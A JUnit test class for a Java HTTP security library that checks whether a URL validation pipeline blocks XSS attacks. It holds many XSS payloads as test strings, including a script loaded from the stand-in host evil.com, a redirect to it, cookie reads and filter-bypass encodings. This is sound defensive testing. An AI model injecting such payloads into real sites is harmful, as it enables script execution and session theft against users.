/*
 * Copyright © 2025 CUI-OpenSource-Software (info@cuioss.de)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package de.cuioss.tools.security.http.tests;

import de.cuioss.test.generator.junit.EnableGeneratorController;
import de.cuioss.test.generator.junit.parameterized.TypeGeneratorSource;
import de.cuioss.tools.security.http.config.SecurityConfiguration;
import de.cuioss.tools.security.http.core.UrlSecurityFailureType;
import de.cuioss.tools.security.http.exceptions.UrlSecurityException;
import de.cuioss.tools.security.http.generators.injection.XssInjectionAttackGenerator;
import de.cuioss.tools.security.http.monitoring.SecurityEventCounter;
import de.cuioss.tools.security.http.pipeline.URLPathValidationPipeline;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;

import static org.junit.jupiter.api.Assertions.*;

/**
 * T11: Test XSS injection patterns
 * 
 * <p>
 * This test class implements Task T11 from the HTTP security validation plan,
 * focusing on testing Cross-Site Scripting (XSS) injection attacks that can
 * execute malicious scripts in users' browsers. XSS attacks are one of the most
 * common and dangerous web application security vulnerabilities, making comprehensive
 * testing essential for secure applications.
 * </p>
 * 
 * <h3>Test Coverage</h3>
 * <ul>
 *   <li>Reflected XSS - Script tags and HTML injection</li>
 *   <li>Stored XSS - Persistent script injection patterns</li>
 *   <li>DOM-based XSS - Client-side script manipulation</li>
 *   <li>JavaScript Protocol Injection - javascript: URLs</li>
 *   <li>Event Handler Injection - onload, onclick, onerror handlers</li>
 *   <li>HTML Attribute Injection - Breaking out of attributes</li>
 *   <li>CSS Expression Injection - CSS-based script execution</li>
 *   <li>SVG-based XSS - Vector graphics script injection</li>
 *   <li>Data URI XSS - Base64 encoded script injection</li>
 *   <li>Filter Bypass Techniques - Encoding and obfuscation</li>
 *   <li>Context-specific Injection - JSON, XML, CSS contexts</li>
 *   <li>Polyglot Payloads - Multi-context attack vectors</li>
 *   <li>Mutation XSS - Browser parsing inconsistencies</li>
 *   <li>Template Injection - Server-side template attacks</li>
 * </ul>
 * 
 * <h3>Security Standards</h3>
 * <ul>
 *   <li>OWASP Top 10 - A03:2021 Injection</li>
 *   <li>CWE-79: Improper Neutralization of Input During Web Page Generation</li>
 *   <li>CWE-83: Improper Neutralization of Script in Attributes</li>
 *   <li>CWE-87: Improper Neutralization of Alternate XSS Syntax</li>
 *   <li>CWE-116: Improper Encoding or Escaping of Output</li>
 *   <li>CWE-692: Incomplete Blacklist to Cross-Site Scripting</li>
 *   <li>NIST SP 800-53 - SI-10 Information Input Validation</li>
 * </ul>
 * 
 * Implements: Task T11 from HTTP verification specification
 * 
 * @author Claude Code Generator
 * @since 2.5
 */
@EnableGeneratorController
@DisplayName("T11: XSS Injection Attack Tests")
class XssInjectionAttackTest {

    private URLPathValidationPipeline pipeline;
    private SecurityEventCounter eventCounter;
    private SecurityConfiguration config;

    @BeforeEach
    void setUp() {
        config = SecurityConfiguration.defaults();
        eventCounter = new SecurityEventCounter();
        pipeline = new URLPathValidationPipeline(config, eventCounter);
    }

    /**
     * Test comprehensive XSS injection attack patterns.
     * 
     * <p>
     * Uses XssInjectionAttackGenerator which creates 14 different types of
     * XSS attacks that should be detected and blocked by the security pipeline.
     * </p>
     * 
     * @param xssAttackPattern An XSS injection attack pattern
     */
    @ParameterizedTest
    @TypeGeneratorSource(value = XssInjectionAttackGenerator.class, count = 140)
    @DisplayName("All XSS injection attacks should be rejected")
    void shouldRejectAllXssInjectionAttacks(String xssAttackPattern) {
        // Given: An XSS attack pattern from the generator
        long initialEventCount = eventCounter.getTotalCount();

        // When: Attempting to validate the XSS attack
        var exception = assertThrows(UrlSecurityException.class,
                () -> pipeline.validate(xssAttackPattern),
                "XSS attack should be rejected: " + sanitizeForDisplay(xssAttackPattern));

        // Then: The validation should fail with appropriate security event
        assertNotNull(exception, "Exception should be thrown for XSS attack");
        assertTrue(isXssRelatedFailure(exception.getFailureType()),
                "Failure type should be XSS related: " + exception.getFailureType() +
                        " for pattern: " + sanitizeForDisplay(xssAttackPattern));

        // And: Original malicious input should be preserved
        assertEquals(xssAttackPattern, exception.getOriginalInput(),
                "Original input should be preserved in exception");

        // And: Security event should be recorded
        assertTrue(eventCounter.getTotalCount() > initialEventCount,
                "Security event should be recorded for: " + sanitizeForDisplay(xssAttackPattern));
    }

    /**
     * Test basic script tag injection attacks.
     * 
     * <p>
     * These are the most fundamental XSS attacks using script tags
     * to inject JavaScript code into web pages.
     * </p>
     */
    @Test
    @DisplayName("Basic script tag injections must be blocked")
    void shouldBlockBasicScriptTagInjections() {
        String[] scriptInjections = {
                // Simple script tags
                "/search?q=<script>alert('XSS')</script>",
                "/user?name=<script>alert(document.cookie)</script>",

                // Script with source
                "/content?data=<script src='//evil.com/xss.js'></script>",

                // Encoded script content
                "/api?input=<script>alert(String.fromCharCode(88,83,83))</script>",

                // Base64 encoded payload
                "/form?value=<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>",

                // Script breaking out of existing tags
                "/profile?bio=</script><script>alert('XSS')</script><script>",

                // Multiple script injections
                "/data?x=<script>alert(1)</script>&y=<script>alert(2)</script>",

                // Mixed with legitimate content
                "/comments?text=Nice post! <script>alert('XSS')</script> Thanks!"
        };

        for (String attack : scriptInjections) {
            long initialEventCount = eventCounter.getTotalCount();

            var exception = assertThrows(UrlSecurityException.class,
                    () -> pipeline.validate(attack),
                    "Script injection should be rejected: " + sanitizeForDisplay(attack));

            assertNotNull(exception);
            assertTrue(isXssRelatedFailure(exception.getFailureType()));
            assertTrue(eventCounter.getTotalCount() > initialEventCount);
        }
    }

    /**
     * Test event handler injection attacks.
     * 
     * <p>
     * Tests XSS attacks that exploit HTML event handlers like onload,
     * onclick, onerror to execute JavaScript code.
     * </p>
     */
    @Test
    @DisplayName("Event handler injections must be blocked")
    void shouldBlockEventHandlerInjections() {
        String[] eventInjections = {
                // Image onerror
                "/upload?file=<img src=x onerror=alert('XSS')>",

                // Body onload
                "/page?content=<body onload=alert('XSS')>",

                // Div onclick
                "/button?html=<div onclick=alert('XSS')>Click me</div>",

                // SVG onload
                "/graphics?svg=<svg onload=alert('XSS')>",

                // Input onfocus with autofocus
                "/form?field=<input onfocus=alert('XSS') autofocus>",

                // Button onclick
                "/ui?element=<button onclick=alert(document.domain)>Submit</button>",

                // Iframe onload
                "/frame?src=<iframe onload=alert('XSS')>",

                // Audio/Video events
                "/media?player=<audio onloadstart=alert('XSS')>",

                // Form onsubmit
                "/form?action=<form onsubmit=alert('XSS')>",

                // Multiple handlers
                "/multi?html=<img src=x onerror=alert(1) onload=alert(2)>"
        };

        for (String attack : eventInjections) {
            long initialEventCount = eventCounter.getTotalCount();

            var exception = assertThrows(UrlSecurityException.class,
                    () -> pipeline.validate(attack),
                    "Event handler injection should be rejected: " + sanitizeForDisplay(attack));

            assertNotNull(exception);
            assertTrue(eventCounter.getTotalCount() > initialEventCount);
        }
    }

    /**
     * Test JavaScript protocol injection attacks.
     * 
     * <p>
     * Tests attacks using javascript: protocol URLs to execute
     * malicious code when clicked or processed.
     * </p>
     */
    @Test
    @DisplayName("JavaScript protocol injections must be blocked")
    void shouldBlockJavaScriptProtocolInjections() {
        String[] jsProtocolAttacks = {
                // Basic javascript: URL
                "/redirect?url=javascript:alert('XSS')",

                // Cookie stealing
                "/link?href=javascript:alert(document.cookie)",

                // Window location manipulation
                "/nav?target=javascript:window.location='http://evil.com'",

                // Encoded characters
                "/url?goto=javascript:alert(String.fromCharCode(88,83,83))",

                // Case variations
                "/forward?to=JaVaScRiPt:alert('XSS')",

                // With null bytes
                "/page?redirect=java\u0000script:alert('XSS')",

                // HTML entity encoded
                "/link?target=javascript:&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;",

                // Template literals
                "/api?callback=javascript:alert`XSS`",

                // With comments
                "/redirect?path=javascript:/**/alert('XSS')",

                // Void expression
                "/url?dest=javascript:void(0);alert('XSS')"
        };

        for (String attack : jsProtocolAttacks) {
            long initialEventCount = eventCounter.getTotalCount();

            var exception = assertThrows(UrlSecurityException.class,
                    () -> pipeline.validate(attack),
                    "JavaScript protocol injection should be rejected: " + sanitizeForDisplay(attack));

            assertNotNull(exception);
            assertTrue(eventCounter.getTotalCount() > initialEventCount);
        }
    }

    /**
     * Test HTML attribute injection attacks.
     * 
     * <p>
     * Tests attacks that break out of HTML attributes to inject
     * malicious code or event handlers.
     * </p>
     */
    @Test
    @DisplayName("HTML attribute injections must be blocked")
    void shouldBlockHtmlAttributeInjections() {
        String[] attributeAttacks = {
                // Breaking out with single quote
                "/form?value=' onload='alert(`XSS`)' '",

                // Breaking out with double quote
                "/input?data=\" onmouseover=\"alert('XSS')\" \"",

                // Closing tag injection
                "/content?html='><script>alert('XSS')</script><'",

                // Multiple attribute injection
                "/field?input=\"></img><svg onload=alert('XSS')><\"",

                // Autofocus with onfocus
                "/form?text=' autofocus onfocus='alert(`XSS`)' '",

                // Style attribute injection
                "/design?css=\" style=\"background:url(javascript:alert('XSS'))\" \"",

                // Title attribute with events
                "/tooltip?title='\" title=\"XSS\" onload=\"alert('XSS')\" \"",

                // Class attribute injection
                "/styling?class='\" class=\"\" onmouseover=\"alert('XSS')\" \"",

                // Href attribute injection
                "/link?url='\" href=\"javascript:alert('XSS')\" \"",

                // Complex breaking sequence
                "/complex?data='></input><img src=x onerror=alert('XSS')><input value='"
        };

        for (String attack : attributeAttacks) {
            long initialEventCount = eventCounter.getTotalCount();

            var exception = assertThrows(UrlSecurityException.class,
                    () -> pipeline.validate(attack),
                    "HTML attribute injection should be rejected: " + sanitizeForDisplay(attack));

            assertNotNull(exception);
            assertTrue(eventCounter.getTotalCount() > initialEventCount);
        }
    }

    /**
     * Test SVG-based XSS injection attacks.
     * 
     * <p>
     * Tests XSS attacks that exploit SVG (Scalable Vector Graphics)
     * elements to execute JavaScript code.
     * </p>
     */
    @Test
    @DisplayName("SVG-based XSS injections must be blocked")
    void shouldBlockSvgBasedXssInjections() {
        String[] svgAttacks = {
                // Basic SVG onload
                "/image?svg=<svg onload=alert('XSS')>",

                // SVG with script tag
                "/graphics?content=<svg><script>alert('XSS')</script></svg>",

                // SVG animate
                "/animation?svg=<svg><animate onbegin=alert('XSS')>",

                // SVG foreignObject
                "/embed?svg=<svg><foreignObject><script>alert('XSS')</script></foreignObject></svg>",

                // SVG use with href
                "/reference?svg=<svg><use href=\"javascript:alert('XSS')\">",

                // SVG image with javascript
                "/picture?svg=<svg><image href=\"javascript:alert('XSS')\">",

                // SVG with namespace
                "/xml?content=<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert('XSS')\">",

                // SVG set element
                "/modify?svg=<svg><set attributeName=onload to=alert('XSS')>",

                // SVG with description
                "/desc?svg=<svg><desc><script>alert('XSS')</script></desc></svg>",

                // Complex SVG shape
                "/shape?svg=<svg width=\"100\" height=\"100\"><circle cx=\"50\" cy=\"50\" r=\"40\" onload=\"alert('XSS')\"/></svg>"
        };

        for (String attack : svgAttacks) {
            long initialEventCount = eventCounter.getTotalCount();

            var exception = assertThrows(UrlSecurityException.class,
                    () -> pipeline.validate(attack),
                    "SVG XSS injection should be rejected: " + sanitizeForDisplay(attack));

            assertNotNull(exception);
            assertTrue(eventCounter.getTotalCount() > initialEventCount);
        }
    }

    /**
     * Test data URI injection attacks.
     * 
     * <p>
     * Tests XSS attacks using data URIs to embed executable
     * content directly in the URL.
     * </p>
     */
    @Test
    @DisplayName("Data URI XSS injections must be blocked")
    void shouldBlockDataUriXssInjections() {
        String[] dataUriAttacks = {
                // HTML data URI
                "/iframe?src=data:text/html,<script>alert('XSS')</script>",

                // Base64 encoded HTML
                "/embed?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",

                // JavaScript data URI
                "/script?src=data:text/javascript,alert('XSS')",

                // Application JavaScript
                "/js?url=data:application/javascript,alert('XSS')",

                // HTML with iframe
                "/frame?data=data:text/html,<iframe src=javascript:alert('XSS')>",

                // SVG data URI
                "/vector?svg=data:image/svg+xml,<svg onload=alert('XSS')>",

                // With charset
                "/page?url=data:text/html;charset=utf-8,<script>alert('XSS')</script>",

                // URL encoded content
                "/encoded?data=data:text/html,%3Cscript%3Ealert('XSS')%3C/script%3E",

                // Minimal data URI
                "/min?url=data:,<script>alert('XSS')</script>",

                // VBScript data URI
                "/vbs?script=data:text/vbscript,MsgBox\"XSS\""
        };

        for (String attack : dataUriAttacks) {
            long initialEventCount = eventCounter.getTotalCount();

            var exception = assertThrows(UrlSecurityException.class,
                    () -> pipeline.validate(attack),
                    "Data URI XSS injection should be rejected: " + sanitizeForDisplay(attack));

            assertNotNull(exception);
            assertTrue(eventCounter.getTotalCount() > initialEventCount);
        }
    }

    /**
     * Test XSS filter bypass techniques.
     * 
     * <p>
     * Tests various encoding and obfuscation techniques commonly
     * used to bypass XSS filters and security controls.
     * </p>
     */
    @Test
    @DisplayName("XSS filter bypass techniques must be blocked")
    void shouldBlockXssFilterBypassTechniques() {
        String[] bypassAttacks = {
                // HTML entity encoding
                "/bypass?input=&#60;script&#62;alert(&#39;XSS&#39;)&#60;/script&#62;",

                // Named HTML entities
                "/entities?code=&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;",

                // Hex encoding
                "/hex?payload=&#x3C;script&#x3E;alert(&#x27;XSS&#x27;)&#x3C;/script&#x3E;",

                // Unicode encoding
                "/unicode?data=\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",

                // Mixed case
                "/case?script=<ScRiPt>alert('XSS')</ScRiPt>",

                // Null byte injection
                "/null?code=<script\u0000>alert('XSS')</script>",

                // Comment insertion
                "/comment?js=<script>/**/alert('XSS')/**/<//script>",

                // Whitespace variations
                "/space?script=<script\t>alert('XSS')</script>",

                // Template literals
                "/template?js=<script>alert`XSS`</script>",

                // String concatenation
                "/concat?code=<script>alert('X'+'SS')</script>",

                // Window property access
                "/window?js=<script>window['alert']('XSS')</script>",

                // Nested tags
                "/nested?html=<<script>script>alert('XSS')</</script>script>",

                // Incomplete tag reconstruction
                "/reconstruct?code=<scri<script>pt>alert('XSS')</scri</script>pt>"
        };

        for (String attack : bypassAttacks) {
            long initialEventCount = eventCounter.getTotalCount();

            var exception = assertThrows(UrlSecurityException.class,
                    () -> pipeline.validate(attack),
                    "XSS bypass technique should be rejected: " + sanitizeForDisplay(attack));

            assertNotNull(exception);
            assertTrue(eventCounter.getTotalCount() > initialEventCount);
        }
    }

    /**
     * Test polyglot XSS payloads.
     * 
     * <p>
     * Tests polyglot payloads that work across multiple contexts
     * and parsing environments, making them particularly dangerous.
     * </p>
     */
    @Test
    @DisplayName("Polyglot XSS payloads must be blocked")
    void shouldBlockPolyglotXssPayloads() {
        String[] polyglotAttacks = {
                // Universal polyglot
                "/polyglot?payload='\"--></script></title></textarea></style></template></noembed></noscript></iframe></noframes></plaintext></xmp><svg onload=alert()>",

                // Multi-context escape
                "/escape?data=';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",

                // Simple multi-context
                "/simple?payload=\"'><img src=x onerror=alert('XSS')>//",

                // Comment-based polyglot
                "/comment?data=*/alert('XSS');//",

                // JSON/JS polyglot
                "/json?data=';alert('XSS');var a='",

                // SQL/XSS combination
                "/sql?query=' OR 1=1; <script>alert('XSS')</script> --",

                // Template polyglot
                "/template?data={{alert('XSS')}}${alert('XSS')}",

                // Multiple protocol polyglot
                "/protocol?url=javascript:alert('XSS')#<script>alert('XSS')</script>"
        };

        for (String attack : polyglotAttacks) {
            long initialEventCount = eventCounter.getTotalCount();

            var exception = assertThrows(UrlSecurityException.class,
                    () -> pipeline.validate(attack),
                    "Polyglot XSS payload should be rejected: " + sanitizeForDisplay(attack));

            assertNotNull(exception);
            assertTrue(eventCounter.getTotalCount() > initialEventCount);
        }
    }

    /**
     * Test performance impact of XSS attack validation.
     * 
     * <p>
     * Ensures that XSS detection doesn't significantly impact
     * validation performance, even with complex payloads.
     * </p>
     */
    @Test
    @DisplayName("XSS attack validation should maintain performance")
    void shouldMaintainPerformanceWithXssAttacks() {
        String complexXssPattern = "/search?q=jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e";

        // Warm up
        for (int i = 0; i < 10; i++) {
            try {
                pipeline.validate(complexXssPattern);
            } catch (UrlSecurityException ignored) {
            }
        }

        // Measure performance
        long startTime = System.nanoTime();
        for (int i = 0; i < 100; i++) {
            try {
                pipeline.validate(complexXssPattern);
            } catch (UrlSecurityException ignored) {
            }
        }
        long endTime = System.nanoTime();

        long averageNanos = (endTime - startTime) / 100;
        long averageMillis = averageNanos / 1_000_000;

        // Should complete within reasonable time (< 7ms per validation)
        assertTrue(averageMillis < 7,
                "XSS validation should complete within 7ms, actual: " + averageMillis + "ms");
    }

    /**
     * Test XSS pattern detection capabilities.
     * 
     * <p>
     * Verifies that the generator's XSS pattern detection
     * methods work correctly for validation purposes.
     * </p>
     */
    @Test
    @DisplayName("XSS pattern detection should work correctly")
    void shouldDetectXssPatternsCorrectly() {
        XssInjectionAttackGenerator generator = new XssInjectionAttackGenerator();

        // Should detect XSS patterns
        assertTrue(generator.containsXssPatterns("<script>alert('XSS')</script>"));
        assertTrue(generator.containsXssPatterns("javascript:alert('XSS')"));
        assertTrue(generator.containsXssPatterns("<img src=x onerror=alert('XSS')>"));
        assertTrue(generator.containsXssPatterns("<svg onload=alert('XSS')>"));
        assertTrue(generator.containsXssPatterns("data:text/html,<script>alert('XSS')</script>"));

        // Should not detect in clean strings
        assertFalse(generator.containsXssPatterns("clean/path/file.html"));
        assertFalse(generator.containsXssPatterns("/search?q=normal+search+terms"));
        assertFalse(generator.containsXssPatterns(null));
        assertFalse(generator.containsXssPatterns(""));
        assertFalse(generator.containsXssPatterns("/api/data?format=json"));
    }

    /**
     * Determines if a failure type is related to XSS attacks.
     * 
     * @param failureType The failure type to check
     * @return true if the failure type indicates an XSS-related security issue
     */
    private boolean isXssRelatedFailure(UrlSecurityFailureType failureType) {
        return failureType == UrlSecurityFailureType.XSS_DETECTED ||
                failureType == UrlSecurityFailureType.SUSPICIOUS_PATTERN_DETECTED ||
                failureType == UrlSecurityFailureType.KNOWN_ATTACK_SIGNATURE ||
                failureType == UrlSecurityFailureType.INVALID_CHARACTER ||
                failureType == UrlSecurityFailureType.MALFORMED_INPUT ||
                failureType == UrlSecurityFailureType.INVALID_STRUCTURE ||
                failureType == UrlSecurityFailureType.PROTOCOL_VIOLATION;
    }

    /**
     * Sanitize XSS attack patterns for safe display in test output.
     * 
     * @param input The potentially malicious input string
     * @return A sanitized version safe for display in logs and test output
     */
    private String sanitizeForDisplay(String input) {
        if (input == null) {
            return "null";
        }

        return input.replace("<", "&lt;")
                .replace(">", "&gt;")
                .replace("\"", "&quot;")
                .replace("'", "&#x27;")
                .replace("&", "&amp;");
    }
}